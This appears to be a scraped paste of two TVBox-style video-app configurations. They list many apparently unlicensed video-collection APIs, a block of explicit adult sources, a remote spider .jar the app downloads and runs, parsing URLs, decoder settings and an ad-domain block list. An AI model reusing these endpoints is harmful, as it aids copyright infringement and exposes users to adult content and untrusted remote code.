{""key"":""非凡资源"",""name"":""非凡资源(🔥)"",""type"":0,""api"":""http://cj.ffzyapi.com/api.php/provide/vod/at/xml"",""searchable"":1,""changeable"":1,""categories"":[""科幻片"",""动作片"",""恐怖片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""伦理片"",""记录片"",""动漫片"",""国产动漫"",""日韩动漫"",""海外动漫"",""国产剧"",""韩国剧"",""日本剧"",""香港剧"",""欧美剧"",""台湾剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺""]},
{""key"":""卧龙资源"",""name"":""卧龙资源(🔥)"",""type"":0,""api"":""https://collect.wolongzyw.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""剧情片"",""恐怖片"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""战争片"",""记录片"",""动画片"",""惊悚片"",""家庭片"",""古装片"",""历史片"",""悬疑片"",""犯罪片"",""伦理片"",""短片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""泰国剧"",""海外剧"",""国产动漫"",""欧美动漫"",""日本动漫"",""港台综艺"",""韩国综艺"",""大陆综艺"",""欧美综艺"",""电影解说""]},
{""key"":""量子资源"",""name"":""量子资源(🔥)"",""type"":0,""api"":""https://cj.lziapi.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""科幻片"",""恐怖片"",""爱情片"",""剧情片"",""战争片"",""记录片"",""伦理片"",""动漫片"",""预告片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""篮球"",""足球"",""网球"",""短剧"",""斯诺克"",""电影解说""]},
{""key"":""高清资源"",""name"":""高清资源(🔥)"",""type"":1,""api"":""https://api.yzzy-api.com/inc/apijson.php"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""记录片"",""倫理片"",""动画片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""福利""]},
{""key"":""樱花资源"",""name"":""樱花资源(🔥)"",""type"":0,""api"":""https://m3u8.apiyhzy.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1},
#福利
{""key"":""樂吧资源"",""name"":""樂吧资源(🔞)"",""type"":1,""api"":""http://lbapiby.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""玉兔资源"",""name"":""玉兔资源(🔞)"",""type"":1,""api"":""https://apiyutu.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""奶香资源"",""name"":""奶香资源(🔞)"",""type"":1,""api"":""https://naixxzy.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""番号资源"",""name"":""番号资源(🔞)"",""type"":0,""api"":""http://fhapi9.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""淫水机云"",""name"":""淫水机云(🔞)"",""type"":0,""api"":""https://www.xrbsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""美少女云"",""name"":""美少女云(🔞)"",""type"":0,""api"":""https://www.msnii.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""苹果资源"",""name"":""苹果资源(🔞)"",""type"":0,""api"":""https://www.pgxdy.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""香奶儿云"",""name"":""香奶儿云(🔞)"",""type"":0,""api"":""https://www.gdlsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""开心果云"",""name"":""开心果云(🔞)"",""type"":0,""api"":""https://www.kxgav.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""小湿妹云"",""name"":""小湿妹云(🔞)"",""type"":0,""api"":""https://www.afasu.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""大地资源"",""name"":""大地资源(🔞)"",""type"":0,""api"":""https://dadiapi.com/api.php"",""searchable"":0,""quickSearch"":0},
{""key"":""雪豹资源"",""name"":""雪豹资源(🔞)"",""type"":0,""api"":""https://api.xbapi.cc/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""老鸭资源"",""name"":""老鸭资源(🔞)"",""type"":0,""api"":""https://api.apilyzy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""老色逼云"",""name"":""老色逼云(🔞)"",""type"":0,""api"":""https://apilsbzy1.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""色南国云"",""name"":""色南国云(🔞)"",""type"":0,""api"":""https://api.sexnguon.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""奥斯卡云"",""name"":""奥斯卡云(🔞)"",""type"":0,""api"":""https://aosikazy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""久久热云"",""name"":""久久热云(🔞)"",""type"":0,""api"":""https://99reapi.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""狼少年云"",""name"":""狼少年云(🔞)"",""type"":0,""api"":""http://cjmygzy.com/inc/sapi.php?ac=videolist"",""playerUrl"":""""},
{""key"":""越资源云"",""name"":""越资源云(🔞)"",""type"":0,""api"":""https://apilsbzy1.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""金坤资源"",""name"":""金坤资源(🔞)"",""type"":0,""api"":""https://www.jkunzyapi.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""一五五云"",""name"":""一五五云(🔞)"",""type"":0,""api"":""https://155api.com/api.php/provide/vod/vod/at/xml"",""playerUrl"":""""},
{""key"":""九九八云"",""name"":""九九八云(🔞)"",""type"":0,""api"":""https://api.998zy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""探探资源"",""name"":""探探资源(🔞)"",""type"":0,""api"":""https://apittzy.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""色猫资源"",""name"":""色猫资源(🔞)"",""type"":0,""api"":""https://caiji.semaozy.net/inc/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""秀人资源"",""name"":""秀人资源(🔞)"",""type"":0,""api"":""https://xiuren.site/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""嘛唞资源"",""name"":""嘛唞资源(🔞)"",""type"":0,""api"":""https://madoucun.com/api.php/provide/vod/at/xml"",""playerUrl"":""""}],
#直播
""lives"":[{""group"":""redirect"",""channels"":[{""name"":""live"",""urls"":[""proxy://do=live&type=txt&ext=aHR0cHM6Ly9naXRlZS5jb20vbGlsaWFuZzc0MTIwL2N4a2o2ODYzL3Jhdy9tYXN0ZXIvbXlTSg==""]}]}],
#解析
""parses"":[
{""name"":""聚合"",""type"":3,""url"":""Demo""},
{""name"":""并发"",""type"":2,""url"":""Parallel""},
{""name"":""轮询"",""type"":2,""url"":""Sequence""},
{""name"":""春风"",""type"":1,""url"":""https://jx.xyflv.cc/?url=""},
{""name"":""夏雨"",""type"":1,""url"":""https://jx.77flv.cc/?url=""},
{""name"":""秋霜"",""type"":1,""url"":""https://jx.xymp4.cc/?url=""},
{""name"":""冬雪"",""type"":1,""url"":""https://jx.xmflv.com/?url=""}],
""flags"":[""youku"",""qq"",""iqiyi"",""imgo"",""m1905"",""letv"",""sohu"",""pptv"",""dbm3u8"",""mgtv"",""wasu"",""bilibili"",""renrenmi"",""xigua"",""ltnb"",""rx"",""CL4K"",""xfyun""],  
#解码    
""ijk"":[{""group"":""软解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""0""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""0""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""0""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""0""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}]},
{""group"":""硬解码"",""options"":[
{""category"":4,""name"":""opensles"",""value"":""0""},
{""category"":4,""name"":""overlay-format"",""value"":""842225234""},
{""category"":4,""name"":""framedrop"",""value"":""1""},  
{""category"":4,""name"":""soundtouch"",""value"":""1""},
{""category"":4,""name"":""start-on-prepared"",""value"":""1""},
{""category"":1,""name"":""http-detect-range-support"",""value"":""0""},
{""category"":1,""name"":""fflags"",""value"":""fastseek""},
{""category"":2,""name"":""skip_loop_filter"",""value"":""48""},
{""category"":4,""name"":""reconnect"",""value"":""1""},
{""category"":4,""name"":""enable-accurate-seek"",""value"":""0""},
{""category"":4,""name"":""mediacodec"",""value"":""1""},
{""category"":4,""name"":""mediacodec-auto-rotate"",""value"":""1""},
{""category"":4,""name"":""mediacodec-handle-resolution-change"",""value"":""1""},
{""category"":4,""name"":""mediacodec-hevc"",""value"":""1""},
{""category"":1,""name"":""dns_cache_timeout"",""value"":""600000000""}]}],
""ads"":[""wan.51img1.com"",""iqiyi.hbuioo.com"",""vip.ffzyad.com"",""https://lf1-cdn-tos.bytegoofy.com/obj/tos-cn-i-dy/455ccf9e8ae744378118e4bd289288dd"",""mimg.0c1q0l.cn"",""www.googletagmanager.com"",""www.google-analytics.com"",""mc.usihnbcq.cn"",""mg.g1mm3d.cn"",""mscs.svaeuzh.cn"",""cnzz.hhttm.top"",""tp.vinuxhome.com"",""cnzz.mmstat.com"",""www.baihuillq.com"",""s23.cnzz.com"",""z3.cnzz.com"",""c.cnzz.com"",""stj.v1vo.top"",""z12.cnzz.com"",""img.mosflower.cn"",""tips.gamevvip.com"",""ehwe.yhdtns.com"",""xdn.cqqc3.com"",""www.jixunkyy.cn"",""sp.chemacid.cn"",""hm.baidu.com"",""s9.cnzz.com"",""z6.cnzz.com"",""um.cavuc.com"",""mav.mavuz.com"",""wofwk.aoidf3.com"",""z5.cnzz.com"",""xc.hubeijieshikj.cn"",""tj.tianwenhu.com"",""xg.gars57.cn"",""k.jinxiuzhilv.com"",""cdn.bootcss.com"",""ppl.xunzhuo123.com"",""xomk.jiangjunmh.top"",""img.xunzhuo123.com"",""z1.cnzz.com"",""s13.cnzz.com"",""xg.huataisangao.cn"",""z7.cnzz.com"",""xg.huataisangao.cn"",""z2.cnzz.com"",""s96.cnzz.com"",""q11.cnzz.com"",""thy.dacedsfa.cn"",""xg.whsbpw.cn"",""s19.cnzz.com"",""z8.cnzz.com"",""s4.cnzz.com"",""f5w.as12df.top"",""ae01.alicdn.com"",""www.92424.cn"",""k.wudejia.com"",""vivovip.mmszxc.top"",""qiu.xixiqiu.com"",""cdnjs.hnfenxun.com"",""cms.qdwght.com""]}"
TsvCZsRc,乐看视界,liliang74120,HTML,Monday 31st of March 2025 05:48:50 PM CDT,"#勿抄袭
{""spider"":""https://d.kstore.dev/download/3300/ja.jar"",""sites"":[
#切片
{""key"":""暴风影院"",""name"":""暴风影院(🔥)"",""type"":1,""api"":""http://bf.xoxowin86cisyap.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""电影片"",""动作片"",""恐怖片"",""科幻片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""纪录片"",""动漫片"",""综艺片"",""理论片"",""连续剧"",""国产剧"",""欧美剧"",""韩国剧"",""香港剧"",""日本剧"",""台湾剧"",""泰国剧"",""海外剧"",""国产动漫"",""日韩动漫"",""欧美动漫"",""海外动漫"",""港台动漫"",""大陆综艺"",""日韩综艺"",""港台综艺"",""欧美综艺"",""电影解说"",""篮球"",""足球"",""斯诺克""]},
{""key"":""天翼资源"",""name"":""天翼资源(🔥)"",""type"":0,""api"":""https://www.911ysw.top/tianyi.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""综艺"",""动漫"",""电影"",""动作片"",""犯罪片"",""冒险片"",""恐怖片"",""惊悚片"",""悬疑片"",""科幻片"",""奇幻片"",""喜剧片"",""爱情片"",""战争片"",""剧情片"",""动画片"",""纪录片"",""伦理片"",""国产剧"",""港台剧"",""日韩剧"",""欧美剧"",""泰国剧""]}, 
{""key"":""最大资源"",""name"":""最大资源(🔥)"",""type"":0,""api"":""http://zuidazy.me/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""4K电影"",""邵氏电影"",""犯罪片"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""剧情片"",""战争片"",""爱情片"",""动画片"",""纪录片"",""预告片"",""演唱会"",""伦理"",""港台三级"",""韩国伦理"",""日本伦理"",""西方伦理"",""写真热舞"",""国产剧"",""港剧"",""台剧"",""泰剧"",""日剧"",""韩剧"",""欧美剧"",""海外剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""有声动漫"",""影视解说"",""爽文短句"",""女频恋爱"",""反转爽剧"",""古装仙侠"",""年代穿越"",""脑洞悬疑"",""现代都市"",""短剧"",""篮球"",""足球"",""网球""]}, 
{""key"":""新黑木耳"",""name"":""新黑木耳(🔥)"",""type"":1,""api"":""https://json.heimuer.xyz/api.php/provide/vod"",""searchable"":1,""changeable"":1,""categories"":[""网络电影"",""动作片"",""冒险片"",""战争片"",""犯罪片"",""恐怖片"",""惊悚片"",""奇幻片"",""悬疑片"",""喜剧片"",""灾难片"",""科幻片"",""剧情片"",""爱情片"",""经典片"",""歌舞片"",""其它片"",""欧美剧"",""国产剧"",""港剧"",""台剧"",""日剧"",""韩剧"",""泰剧"",""新马剧"",""其他剧"",""电视剧"",""电影"",""古装短剧"",""逆袭短剧"",""神豪短剧"",""虐恋短剧"",""重生短剧"",""复仇短剧"",""穿越短剧"",""甜宠短剧"",""强者短剧"",""其它短剧"",""动画电影"",""国产动漫"",""日本动漫"",""韩国动漫"",""欧美动漫"",""港台动漫"",""其它动漫"",""新马泰综艺"",""其他综艺"",""日本综艺"",""国产综艺"",""韩国综艺"",""港台综艺"",""欧美综艺""]},
{""key"":""新华为吧"",""name"":""新华为吧(🔥)"",""type"":0,""api"":""https://huaweiba.live/api.php/provide/vod/at/xml"",""searchable"":1,""changeable"":1,""categories"":[""网络电影"",""恐怖片"",""惊悚片"",""奇幻片"",""悬疑片"",""灾难片"",""科幻片"",""动作片"",""冒险片"",""战争片"",""犯罪片"",""喜剧片"",""剧情片"",""爱情片"",""经典片"",""纪录片"",""歌舞片"",""伦理片"",""欧美剧"",""国产剧"",""港剧"",""台剧"",""日剧"",""韩剧"",""泰剧"",""新马剧"",""其他剧"",""体育"",""动画电影"",""国产动漫"",""日韩动漫"",""欧美动漫"",""港台动漫"",""其他动漫"",""新马泰综艺"",""其他综艺"",""日韩综艺"",""国产综艺"",""港台综艺"",""欧美综艺""]}, 
{""key"":""虎牙资源"",""name"":""虎牙资源(🔥)"",""type"":1,""api"":""https://www.huyaapi.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""动画片"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""战争片"",""剧情片"",""纪录片"",""伦理片"",""香港剧"",""日剧"",""韩剧"",""欧美剧"",""马泰剧"",""台湾剧"",""内地剧"",""电视剧"",""中国动漫"",""日本动漫"",""欧美动漫"",""短剧"",""动漫"",""电影"",""综艺"",""体育赛事""]},
{""key"":""漫道资源"",""name"":""漫道资源(🔥)"",""type"":1,""api"":""http://www.mandao.site/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""犯罪片"",""悬疑片"",""奇幻片"",""剧情片"",""战争片"",""纪录片"",""连续剧"",""国产剧"",""欧美剧"",""港台剧"",""日韩剧"",""海外剧"",""动漫"",""短剧"",""体育"",""篮球"",""网球"",""足球"",""综艺"",""电影"",""斯诺克"",""电影解说""]},
{""key"":""快龙资源"",""name"":""快龙资源(🔥)"",""type"":0,""api"":""https://lz.118318.xyz/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""科幻片"",""恐怖片"",""动作片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""伦理片"",""动漫片"",""预告片"",""记录片"",""电影片"",""综艺片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""连续剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""篮球"",""足球"",""网球"",""短剧"",""斯诺克"",""电影解说""]},
{""key"":""极速资源"",""name"":""极速资源(🔥)"",""type"":1,""api"":""https://jszyapi.com/api.php/provide/vod"",""searchable"":1,""changeable"":1,""categories"":[""短剧"",""日剧"",""韩剧"",""马泰剧"",""内地剧"",""欧美剧"",""香港剧"",""台湾剧"",""电视剧"",""恐怖片"",""动画片"",""剧情片"",""战争片"",""动作片"",""爱情片"",""喜剧片"",""科幻片"",""灾难片"",""悬疑片"",""犯罪片"",""奇幻片"",""记录片"",""伦理片"",""电影"",""中国动漫"",""日本动漫"",""欧美动漫"",""动漫"",""综艺"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""体育赛事""]},
{""key"":""黑墙资源"",""name"":""黑墙资源(🔥)"",""type"":0,""api"":""https://blackwallvideo.online/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""快看资源"",""name"":""快看资源(🔥)"",""type"":3,""api"":""csp_Kuaikan"",""searchable"":1,""quickSearch"":1},  
{""key"":""火狐资源"",""name"":""火狐资源(🔥)"",""type"":1,""api"":""https://hhzyapi.com/api.php/provide/vod/from/hhm3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""爱情片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""悬疑片"",""犯罪片"",""奇幻片"",""灾难片"",""伦理片"",""电影"",""电视剧"",""内地剧"",""欧美剧"",""香港剧"",""短剧"",""韩剧"",""日剧"",""台湾剧"",""马泰剧"",""动漫"",""日本动漫"",""欧美动漫"",""中国动漫"",""综艺"",""大陆综艺"",""日韩综艺"",""欧美综艺"",""港台综艺""]},
{""key"":""红牛资源"",""name"":""红牛资源(🔥)"",""type"":0,""api"":""https://www.hongniuzy2.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""科幻片"",""恐怖片"",""剧情片"",""动作片"",""喜剧片"",""爱情片"",""战争片"",""伦理片"",""纪录片"",""泰剧"",""韩剧"",""日剧"",""国产剧"",""港澳剧"",""欧美剧"",""台湾剧"",""综艺"",""动漫"",""动漫电影""]},
{""key"":""飘凌资源"",""name"":""飘凌资源(🔥)"",""type"":1,""api"":""https://p2100.net/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏大片"",""国产剧"",""香港剧"",""台湾剧"",""海外剧"",""欧美剧"",""韩国剧"",""日本剧"",""综艺"",""动作片"",""喜剧片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""爱情片"",""理论片"",""动漫片"",""动漫""]},
{""key"":""无尽资源"",""name"":""无尽资源(🔥)"",""type"":0,""api"":""https://api.wujinapi.me/api.php/provide/vod/from/wjm3u8/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""奇幻片"",""剧情片"",""战争片"",""爱情片"",""悬疑片"",""犯罪片"",""伦理片"",""纪录片"",""动画片"",""日韩动漫"",""国产动漫"",""欧美动漫"",""国产剧"",""香港剧"",""台湾剧"",""海外剧"",""欧美剧"",""韩国剧"",""日本剧"",""泰剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺""]},
{""key"":""速播资源"",""name"":""速播资源(🔥)"",""type"":1,""api"":""https://subocaiji.com/api.php/provide/vod/from/subyun/at/json"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""纪录片"",""伦理片"",""大陆剧"",""台湾剧"",""港澳剧"",""日剧"",""韩剧"",""泰剧"",""美剧"",""电视剧"",""动漫电影"",""中国动漫"",""日本动漫"",""欧美动漫"",""动漫"",""解说"",""电影"",""综艺"",""短剧"",""体育赛事""]},
{""key"":""闪电资源"",""name"":""闪电资源(🔥)"",""type"":0,""api"":""https://shandianzy.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""预告片"",""国产剧"",""韩剧"",""台剧"",""港剧"",""欧美剧"",""日剧"",""泰剧"",""海外剧"",""女频恋爱"",""反转爽剧"",""古装仙侠"",""年代穿越"",""脑洞悬疑"",""现代都市"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""日韩动漫"",""有声动漫"",""伦理"",""港台三级"",""韩国伦理"",""日本伦理"",""西方伦理"",""写真热舞"",""演唱会"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""篮球"",""足球"",""影视解说""]},
{""key"":""苹果影视"",""name"":""苹果影视(🔥)"",""type"":1,""api"":""https://pg.fenwe078.cf/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""电影"",""连续剧"",""国产剧"",""欧美剧"",""日韩剧"",""港台剧"",""海外剧"",""动漫"",""动画片"",""动漫电影"",""欧美动漫"",""日韩动漫"",""国产动漫"",""综艺"",""大陆综艺""]},
{""key"":""影图影视"",""name"":""影图影视(🔥)"",""type"":1,""api"":""https://cj.vodimg.top/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""综艺"",""动漫"",""电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""连续剧"",""国产剧"",""港台剧"",""日韩剧"",""欧美剧""]},
{""key"":""高清资源"",""name"":""高清资源(🔥)"",""type"":1,""api"":""https://api.yzzy-api.com/inc/apijson.php"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""记录片"",""倫理片"",""动画片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""福利""]},
{""key"":""鸭鸭影视"",""name"":""鸭鸭影视(🔥)"",""type"":0,""api"":""https://yayazy2.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""梦梦影视"",""name"":""梦梦影视(🔥)"",""type"":0,""api"":""https://www.gtrgt.com//api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""等待影视"",""name"":""等待影视(🔥)"",""type"":0,""api"":""https://cj.vodimg.top/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""采库资源"",""name"":""采库资源(🔥)"",""type"":0,""api"":""https://ckzy.me/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""光速资源"",""name"":""光速资源(🔥)"",""type"":1,""api"":""https://api.guangsuapi.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""恐怖片"",""爱情片"",""科幻片"",""战争片"",""剧情片"",""伦理片"",""记录片"",""大陆剧"",""欧美剧"",""港澳剧"",""台湾剧"",""韩剧"",""日剧"",""泰剧"",""综艺"",""动漫"",""动漫电影""]},
{""key"":""索尼资源"",""name"":""索尼资源(🔥)"",""type"":1,""api"":""https://suoniapi.com/api.php/provide/vod/from/snm3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""4K电影"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""爱情片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""预告片"",""演唱会"",""国产剧"",""欧美剧"",""韩剧"",""港剧"",""日剧"",""台剧"",""泰剧"",""海外剧"",""国产动漫"",""日韩动漫"",""欧美动漫"",""海外动漫"",""港台动漫"",""伦理"",""港台三级"",""韩国伦理"",""西方理论"",""日本伦理"",""写真热舞"",""篮球"",""足球"",""大陆综艺"",""日韩综艺"",""港台综艺"",""欧美综艺"",""影视解说"",""爽文短句""]},
{""key"":""金鹰资源"",""name"":""金鹰资源(🔥)"",""type"":1,""api"":""https://jyzyapi.com/provide/vod/from/jym3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""爱情片"",""喜剧片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""动画片"",""伦理片"",""记录片"",""欧美剧"",""香港剧"",""韩剧"",""日剧"",""马泰剧"",""内地剧"",""台湾剧"",""中国动漫"",""日本动漫"",""欧美动漫"",""综艺"",""短剧"",""电影"",""电视剧"",""体育赛事""]},
{""key"":""非凡资源"",""name"":""非凡资源(🔥)"",""type"":1,""api"":""http://cj.ffzyapi.com/api.php/provide/vod/from/ffm3u8"",""searchable"":1,""changeable"":1,""categories"":[""科幻片"",""动作片"",""恐怖片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""伦理片"",""记录片"",""动漫片"",""国产动漫"",""日韩动漫"",""海外动漫"",""国产剧"",""韩国剧"",""日本剧"",""香港剧"",""欧美剧"",""台湾剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺""]},
{""key"":""卧龙资源"",""name"":""卧龙资源(🔥)"",""type"":1,""api"":""https://collect.wolongzyw.com/api.php/provide/vod/from/wlm3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""剧情片"",""恐怖片"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""战争片"",""记录片"",""动画片"",""惊悚片"",""家庭片"",""古装片"",""历史片"",""悬疑片"",""犯罪片"",""伦理片"",""短片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""泰国剧"",""海外剧"",""国产动漫"",""欧美动漫"",""日本动漫"",""港台综艺"",""韩国综艺"",""大陆综艺"",""欧美综艺"",""电影解说""]},
{""key"":""量子资源"",""name"":""量子资源(🔥)"",""type"":1,""api"":""https://cj.lziapi.com/api.php/provide/vod/from/lzm3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""科幻片"",""恐怖片"",""爱情片"",""剧情片"",""战争片"",""记录片"",""伦理片"",""动漫片"",""预告片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""篮球"",""足球"",""网球"",""短剧"",""斯诺克"",""电影解说""]},
{""key"":""樱花资源"",""name"":""樱花资源(🔥)"",""type"":0,""api"":""https://m3u8.apiyhzy.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1},
#福利
{""key"":""樂吧资源"",""name"":""樂吧资源(🔞)"",""type"":1,""api"":""http://lbapiby.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""玉兔资源"",""name"":""玉兔资源(🔞)"",""type"":1,""api"":""https://apiyutu.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""奶香资源"",""name"":""奶香资源(🔞)"",""type"":1,""api"":""https://naixxzy.com/api.php/provide/vod"",""playerUrl"":""""},
{""key"":""番号资源"",""name"":""番号资源(🔞)"",""type"":0,""api"":""http://fhapi9.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""淫水机云"",""name"":""淫水机云(🔞)"",""type"":0,""api"":""https://www.xrbsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""美少女云"",""name"":""美少女云(🔞)"",""type"":0,""api"":""https://www.msnii.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""苹果资源"",""name"":""苹果资源(🔞)"",""type"":0,""api"":""https://www.pgxdy.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""香奶儿云"",""name"":""香奶儿云(🔞)"",""type"":0,""api"":""https://www.gdlsp.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""开心果云"",""name"":""开心果云(🔞)"",""type"":0,""api"":""https://www.kxgav.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""小湿妹云"",""name"":""小湿妹云(🔞)"",""type"":0,""api"":""https://www.afasu.com/api/xml.php"",""searchable"":0,""quickSearch"":0},
{""key"":""大地资源"",""name"":""大地资源(🔞)"",""type"":0,""api"":""https://dadiapi.com/api.php"",""searchable"":0,""quickSearch"":0},
{""key"":""雪豹资源"",""name"":""雪豹资源(🔞)"",""type"":0,""api"":""https://api.xbapi.cc/api.php/provide/vod/at/xml"",""playerUrl"":""""},
